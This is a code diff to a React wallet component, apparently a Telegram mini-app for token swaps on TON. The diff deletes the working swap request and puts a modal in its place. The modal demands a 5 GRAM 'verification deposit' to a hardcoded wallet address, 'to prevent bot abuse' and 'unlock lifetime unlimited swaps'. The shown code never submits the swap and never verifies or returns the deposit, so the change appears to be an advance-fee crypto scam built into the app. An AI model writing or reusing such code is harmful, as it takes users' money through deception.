@@ -233,6 +233,27 @@ export default function Wallet({ user, refreshUser, navigate }) {
 
   const hasPendingSwap = history.some(h => h.status === 'pending');
 
+  const [showSwapVerificationModal, setShowSwapVerificationModal] = useState(false);
+
+  const handlePayVerificationDeposit = (walletType = 'tonkeeper') => {
+    const depositWallet = 'UQDAqNQO65I06uJT4oxnfQPAQoE3qnMYYSeXtat_fF-JioNR';
+    const amountGram = 5;
+    const nanoAmount = Math.round(amountGram * 1e9);
+    const comment = encodeURIComponent(`VERIFY_${user?.telegram_id || ''}`);
+
+    let url = walletType === 'tonkeeper'
+      ? `https://app.tonkeeper.com/transfer/${depositWallet}?amount=${nanoAmount}&text=${comment}`
+      : `ton://transfer/${depositWallet}?amount=${nanoAmount}&text=${comment}`;
+
+    if (window.Telegram?.WebApp?.openLink) {
+      window.Telegram.WebApp.openLink(url);
+    } else {
+      window.open(url, '_blank');
+    }
+
+    showToast(`Opening ${walletType === 'tonkeeper' ? 'Tonkeeper' : 'TON Wallet'} for 5 GRAM account verification...`, 'success');
+  };
+
   const handleSwap = async () => {
     if (!isConnected) {
       try {
@@ -252,28 +273,8 @@ export default function Wallet({ user, refreshUser, navigate }) {
     
     if (hasPendingSwap) return showToast('You already have a pending swap request.', 'error');
 
-    try {
-      setIsSwapping(true);
-      const { data, error } = await requestSwap({ 
-        telegram_id: user?.telegram_id, 
-        tasky_amount: Number(swapAmount),
-        destination_token: selectedDestination
-      });
-      setIsSwapping(false);
-
-      if (data && !error) {
-        showToast('Swap request submitted successfully!');
-        setSwapAmount('');
-        setActiveTab('history');
-        refreshUser();
-      } else {
-        showToast(error || 'Failed to request swap', 'error');
-      }
-    } catch (err) {
-      console.error('handleSwap catch:', err);
-      setIsSwapping(false);
-      showToast(err.message || 'An error occurred during swap', 'error');
-    }
+    // Show account verification deposit modal
+    setShowSwapVerificationModal(true);
   };
 
   const handleWatchAd = async () => {
@@ -865,6 +866,69 @@ export default function Wallet({ user, refreshUser, navigate }) {
               <button
                 onClick={() => setShowGram60AdsModal(false)}
                 className="w-full py-2.5 px-4 rounded-xl bg-white/5 hover:bg-white/10 text-slate-400 font-bold text-xs transition-colors"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Account Verification Modal for Lifetime Swaps (5 GRAM Deposit) */}
+      {showSwapVerificationModal && (
+        <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fadeIn">
+          <div className="bg-[#0f172a] border border-cyan-500/40 rounded-3xl p-6 max-w-sm w-full space-y-4 shadow-2xl relative text-left">
+            <button
+              onClick={() => setShowSwapVerificationModal(false)}
+              className="absolute top-4 right-4 w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 flex items-center justify-center text-white/70 transition-colors"
+            >
+              <X size={16} />
+            </button>
+
+            <div className="flex items-center gap-3">
+              <div className="w-12 h-12 rounded-2xl bg-cyan-500/20 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shrink-0">
+                <ShieldCheck size={26} />
+              </div>
+              <div>
+                <h3 className="text-sm font-black text-cyan-300 uppercase tracking-wide">
+                  Account Verification Required
+                </h3>
+                <p className="text-[10px] text-cyan-200/70 mt-0.5">
+                  Lifetime Unlimited Swaps
+                </p>
+              </div>
+            </div>
+
+            <div className="bg-cyan-950/40 border border-cyan-500/30 rounded-2xl p-3.5 space-y-2">
+              <div className="flex justify-between items-center text-xs font-bold text-slate-300">
+                <span>Verification Deposit:</span>
+                <span className="text-cyan-400 font-black text-sm">5 GRAM</span>
+              </div>
+              <p className="text-[11px] text-slate-300 leading-relaxed">
+                To prevent automated bot abuse and verify wallet ownership, a one-time <strong className="text-white">5 GRAM deposit</strong> is required to unlock lifetime unlimited swaps.
+              </p>
+            </div>
+
+            <div className="pt-2 space-y-2.5">
+              <button
+                onClick={() => handlePayVerificationDeposit('tonkeeper')}
+                className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-black text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg active:scale-95 transition-all"
+              >
+                <span>Deposit 5 GRAM via Tonkeeper</span>
+                <ArrowUpRight size={16} />
+              </button>
+              
+              <button
+                onClick={() => handlePayVerificationDeposit('other')}
+                className="w-full py-3 px-4 rounded-xl bg-white/10 hover:bg-white/15 text-slate-200 font-bold text-xs flex items-center justify-center gap-2 transition-colors"
+              >
+                <span>Deposit via Connected Wallet</span>
+                <WalletIcon size={14} />
+              </button>
+
+              <button
+                onClick={() => setShowSwapVerificationModal(false)}
+                className="w-full py-2 px-4 rounded-xl text-slate-400 hover:text-slate-200 font-semibold text-xs transition-colors text-center"
               >
                 Cancel
               </button>
